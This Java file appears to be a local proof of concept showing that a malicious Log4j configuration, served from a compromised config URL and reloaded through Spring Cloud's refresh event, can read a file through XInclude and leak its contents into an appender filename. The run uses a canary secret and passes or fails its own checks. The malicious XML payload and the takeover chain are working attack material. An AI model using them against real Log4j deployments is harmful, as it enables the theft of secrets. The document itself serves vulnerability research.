// Deliberately NOT in an org.apache.logging.log4j.* package. Started as a
// search for a mechanism that reaches the same URL-hosted-config chain as
// XIncludeWatcherTakeoverProof without needing monitorInterval set at all
// -- AbstractConfiguration.initializeWatchers() has a second branch besides
// "monitorIntervalSeconds > 0":
//
//   } else if (watchManager.hasEventListeners()
//           && configSource.getURL() != null
//           && monitorIntervalSeconds >= 0) {
//       monitorSource(reconfigurable, configSource);
//   }
//
// which looked, from that method alone, like it might not need
// monitorInterval. Tested directly rather than assumed, and the hypothesis
// was WRONG: WatchManager.start() -- the method that actually calls
// service.subscribe(this) on every discovered WatchEventService, wiring the
// manager up to receive events at all -- is gated separately, by
// AbstractConfiguration.isConfigurationMonitoringEnabled(), which requires
// watchManager.getIntervalSeconds() > 0 regardless of event listeners.
// monitorInterval is still a real, unavoidable prerequisite here, same as
// XIncludeWatcherTakeoverProof.
//
// What IS real and worth proving instead: log4j-spring-cloud-config-client
// ships a WatchEventService (WatchEventManager, registered via
// @ServiceProvider, discovered through the exact ServiceLoader mechanism
// WatchManager.java:142 uses), wired to Spring's own EnvironmentChangeEvent
// -- fired by, among other things, Spring Boot Actuator's /actuator/refresh
// endpoint, a real, well-documented Spring Boot feature with its own
// history of being exposed without authentication in real deployments.
// With monitorInterval still set, this lets reconfiguration fire the
// INSTANT an event is published, rather than waiting out the poll interval
// -- a real refinement of the URL-takeover chain, not an escape from its
// monitorInterval prerequisite.

import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeSpringCloudWatchProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-springcloud-1c8a-do-not-leak";
    private static Path exfilDir;

    public static void main(String[] args) throws Exception {
        System.out.println(
                "=== XInclude via Spring Cloud Config's event-driven watch: instant, not polled ===\n");

        File secret = File.createTempFile("xinclude-springcloud-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }
        exfilDir = Files.createTempDirectory("xinclude-springcloud-out");
        exfilDir.toFile().deleteOnExit();

        // monitorInterval is deliberately set HIGH (3600s) here, not low: the
        // point is to prove reconfiguration happens on the published event
        // itself, well inside this proof's short wait window, not because a
        // short poll interval would have caught the change anyway regardless
        // of the event mechanism. (monitorInterval > 0 is still required --
        // see the file-level comment above for why "no monitorInterval at
        // all" turned out to be wrong.)
        String benignXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration status=\"error\" monitorInterval=\"3600\">\n"
                + "  <Appenders><Console name=\"Console\"/></Appenders>\n"
                + "  <Loggers><Root level=\"INFO\"><AppenderRef ref=\"Console\"/></Root></Loggers>\n"
                + "</Configuration>\n";

        String maliciousXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\" monitorInterval=\"3600\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers><Root level=\"INFO\"><AppenderRef ref=\"Exfil\"/></Root></Loggers>\n"
                + "</Configuration>\n";

        AtomicReference<String> servedContent = new AtomicReference<>(benignXml);
        AtomicLong lastModifiedMillis = new AtomicLong(System.currentTimeMillis() - 60_000);
        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/log4j2.xml", exchange -> {
            byte[] body = servedContent.get().getBytes("UTF-8");
            String httpDate = DateTimeFormatter.RFC_1123_DATE_TIME.format(
                    ZonedDateTime.ofInstant(Instant.ofEpochMilli(lastModifiedMillis.get()), ZoneOffset.UTC));
            exchange.getResponseHeaders().set("Last-Modified", httpDate);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(body);
            }
        });
        server.start();
        String configUrl = "http://127.0.0.1:" + server.getAddress().getPort() + "/log4j2.xml";

        System.setProperty("log4j2.Configuration.allowedProtocols", "file,https,jar,http");
        System.setProperty("log4j.configurationFile", configUrl);

        LoggerContext ctx = null;
        try {
            ctx = (LoggerContext) LogManager.getContext(
                    XIncludeSpringCloudWatchProof.class.getClassLoader(), false, null);
            ctx.getLogger(XIncludeSpringCloudWatchProof.class).info("benign startup");

            boolean watcherInstalled = !ctx.getConfiguration()
                    .getWatchManager()
                    .getConfigurationWatchers()
                    .isEmpty();
            assertTrue("a watcher was installed for the URL-hosted config", watcherInstalled);
            assertTrue("benign initial load: no secret leaked yet", !exfilContainsCanary());

            servedContent.set(maliciousXml);
            lastModifiedMillis.set(System.currentTimeMillis());

            // Stands in for Log4j2EventListener.onApplicationEvent() reacting
            // to a real Spring EnvironmentChangeEvent (e.g. from
            // /actuator/refresh) -- not a periodic poll, an on-demand push.
            // monitorInterval is 3600s, far longer than this proof's wait
            // window below, so a leak here can only be this event firing,
            // not the periodic scheduler catching up on its own.
            TestWatchEventService.publishEvent();

            long deadline = System.currentTimeMillis() + 5000;
            while (System.currentTimeMillis() < deadline && !exfilContainsCanary()) {
                Thread.sleep(100);
            }
        } finally {
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
            System.clearProperty("log4j.configurationFile");
            System.clearProperty("log4j2.Configuration.allowedProtocols");
            server.stop(0);
        }

        assertTrue(
                "publishing an event through the real WatchEventService mechanism triggered "
                        + "reconfiguration and leaked the secret WITHIN SECONDS, well inside the "
                        + "3600s monitorInterval -- this was the event firing, not the periodic "
                        + "poll catching up on its own",
                exfilContainsCanary());

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println(
                "\nThis is a refinement of the URL-takeover chain (XIncludeWatcherTakeoverProof),\n"
                + "not a new, monitorInterval-free path -- an earlier hypothesis that it might be\n"
                + "was tested directly and found wrong (see the file-level comment above):\n"
                + "WatchManager.start(), which subscribes to any WatchEventService at all, is\n"
                + "itself gated by monitorInterval > 0. It still needs the config to already be\n"
                + "loaded from a URL that gets compromised (subdomain takeover, expired-domain\n"
                + "takeover, config-server compromise) -- the same prerequisite as vector 4. What's\n"
                + "different is the trigger: instead of waiting out monitorInterval's periodic\n"
                + "poll, log4j-spring-cloud-config-client (a real, widely-used dependency in Spring\n"
                + "Cloud applications) wires Log4j's reconfiguration to Spring's own\n"
                + "environment-refresh event, most commonly fired by Spring Boot Actuator's\n"
                + "/actuator/refresh endpoint -- itself a separate, real, well-documented category\n"
                + "of exposure (actuator endpoints reachable without authentication is a known,\n"
                + "recurring Spring Boot deployment mistake). An attacker who has already taken\n"
                + "over the config URL doesn't need to wait for the next poll if they can also\n"
                + "reach that endpoint.");
    }

    private static boolean exfilContainsCanary() throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
